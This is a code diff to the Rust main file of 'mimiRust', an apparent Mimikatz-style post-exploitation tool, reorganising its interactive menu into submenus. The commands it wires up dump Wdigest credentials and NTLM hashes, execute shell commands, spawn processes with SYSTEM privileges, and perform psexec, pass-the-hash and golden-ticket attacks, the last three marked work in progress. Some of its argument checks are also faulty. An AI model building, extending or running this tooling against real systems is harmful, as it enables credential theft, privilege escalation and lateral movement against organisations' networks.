@@ -17,6 +17,7 @@ use passwords::{
 use privilege::Escalation;
 use utilities::Utils;
 
+use console::Term;
 use clap::Parser;
 use anyhow::Result;
 
@@ -47,18 +48,8 @@ fn main() -> Result<()> {
     if args.spawn_path.len() == 0 && args.shell.len() == 0 && args.dump_credentials == false && args.dump_hashes == false {
         println!("{}", banner());
         loop {
-            if !Utils::is_elevated() {
-                let input = Utils::get_user_input(2);
-                handle_user_input(input)?;
-            } else {
-                if !Utils::is_system() {
-                    let input = Utils::get_user_input(1);
-                    handle_user_input(input)?;
-                } else {
-                    let input = Utils::get_user_input(0);
-                    handle_user_input(input)?;
-                }
-            }
+            let input = Utils::get_user_input(None);
+            handle_user_input(input)?;
         }
     }
 
@@ -102,59 +93,142 @@ fn banner() -> String {
     ".to_string();
 }
 
-// dump-credentials
-// dump-hashes
-// exit
-// golden-ticket
-// help
-// psexec
-// pth
-// shell
-// spawn-path
+//Perhaps make the menu in the way of :: use <mode>
 
 fn handle_user_input(args: Vec<String>) -> Result<()> {
     match args[0].to_lowercase().as_str() {
-        "dump-credentials" => {
-            Wdigest::grab()?;
+        "passwords" => {
+            loop {
+                let input = Utils::get_user_input(Some("passwords".to_string()));
+                match input[0].to_lowercase().as_str() {
+                    "dump-credentials" => {
+                        Wdigest::grab()?;
+                    },
+                    "dump-hashes" => {
+                        Ntlm::grab()?;
+                    },
+                    "clear" => {
+                        let term = Term::stdout();
+                        term.clear_screen()?;
+                        banner();
+                    },
+                    "exit" => {
+                        main()?;
+                    },
+                    _ => {
+                        println!("
+                        \rdump-credentials             Dumps systems credentials through Wdigest.
+                        \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
+                        \rclear                        Clears the screen of any past output.
+                        \rexit                         Moves to top level menu
+                        ");
+                    },
+                };
+            }
         },
-        "dump-hashes" => {
-            Ntlm::grab()?;
+        "pivioting" => {
+            loop {
+                let input = Utils::get_user_input(Some("pivioting".to_string()));
+                match input[0].to_lowercase().as_str() {
+                    "shell" => {
+                        if input.clone().len() >= 1 {
+                            Escalation::execute_shell(input.clone())?;
+                        } else {
+                            println!("[*] Please use it as: shell <SHELL COMMAND>");
+                        }
+                    },
+                    "clear" => {
+                        let term = Term::stdout();
+                        term.clear_screen()?;
+                        banner();
+                    },
+                    "exit" => {
+                        main()?;
+                    },
+                    "psexec" => {
+                        PSExec::new();
+                    },
+                    "pth" => {
+                        ExecuteWMI::new();
+                    },
+                    "golden-ticket" => {
+                        GoldenTicket::create();
+                    },
+                    _ => {
+                        println!("
+                        \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
+                        \rclear                        Clears the screen of any past output.
+                        \rexit                         Moves to top level menu
+                        \r(W.I.P)psexec                Executes a service on another system.
+                        \r(W.I.P)pth                   Pass-the-Hash to run a command on another system.
+                        \r(W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.
+                        ")
+                    },
+                };
+            }
+        },
+        "privilege" => {
+            loop {
+                let input = Utils::get_user_input(Some("privilege".to_string()));
+                match input[0].to_lowercase().as_str() {
+                    "spawn-path" => {
+                        if input.len() >= 1 {
+                            Escalation::get_system(input[1].clone())?;
+                        } else {
+                            println!("[*] Please use it as: spawn-path <PATH TO EXECUTABLE>");
+                        }
+                    },
+                    "clear" => {
+                        let term = Term::stdout();
+                        term.clear_screen()?;
+                        banner();
+                    },
+                    "exit" => {
+                        main()?;
+                    },
+                    _ => {
+                        println!("
+                        \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
+                        \rclear                        Clears the screen of any past output.
+                        \rexit                         Moves to top level menu
+                        ")
+                    },
+                };
+            }
+        },
+        "clear" => {
+            let term = Term::stdout();
+            term.clear_screen()?;
+            banner();
         },
         "exit" => {
             println!("Bye!");
             std::process::exit(0x100);
         },
-        "golden-ticket" => {
-            GoldenTicket::create();
-        },
         "help" | "h" | "?" => {
             println!("
-            \rdump-credentials             Dumps systems credentials through Wdigest.
-            \rdump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
-            \rexit                         Exits out of mimiRust.
-            \rgolden-ticket                Creates a golden ticket for an useraccount with the domain.
-            \rhelp - h - ?                 Shows this message.
-            \rpsexec                       Executes a service on another system.
-            \rpth                          Pass-the-Hash run a command on another system.
-            \rshell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
-            \rspawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
+            \r
+            \rChoose one of the following options:
+            \r
+            \r      passwords:
+            \r              • dump-credentials             Dumps systems credentials through Wdigest.
+            \r              • dump-hashes                  Dumps systems NTLM hashes (requires SYSTEM permissions).
+            \r              • clear                        Clears the screen of any past output.
+            \r              • exit                         Moves to top level menu
+            \r
+            \r      pivioting:
+            \r              • shell <SHELL COMMAND>        Execute a shell command through cmd, returns output.
+            \r              • clear                        Clears the screen of any past output.
+            \r              • exit                         Moves to top level menu
+            \r              • (W.I.P)psexec                Executes a service on another system.
+            \r              • (W.I.P)pth                   Pass-the-Hash to run a command on another system.
+            \r              • (W.I.P)golden-ticket         Creates a golden ticket for a user account with the domain.
+            \r
+            \r      privilege:
+            \r              • spawn-path <SPAWN_PATH>      Spawn program with SYSTEM permissions from location.
+            \r              • clear                        Clears the screen of any past output.
+            \r              • exit                         Moves to top level menu
             \n\n");
-        },
-        "psexec" => {
-            PSExec::new();
-        },
-        "pth" => {
-            ExecuteWMI::new();
-        },
-        "shell" => {
-            if args.len() >= 1 {
-                Escalation::execute_shell(args)?;
-            }
-        },
-        "spawn-path" => {
-            if args.len() >= 1 {
-                Escalation::get_system(args[1].clone())?;
-            }
         },
         _ => {
             println!("Please use: help, h or ?");
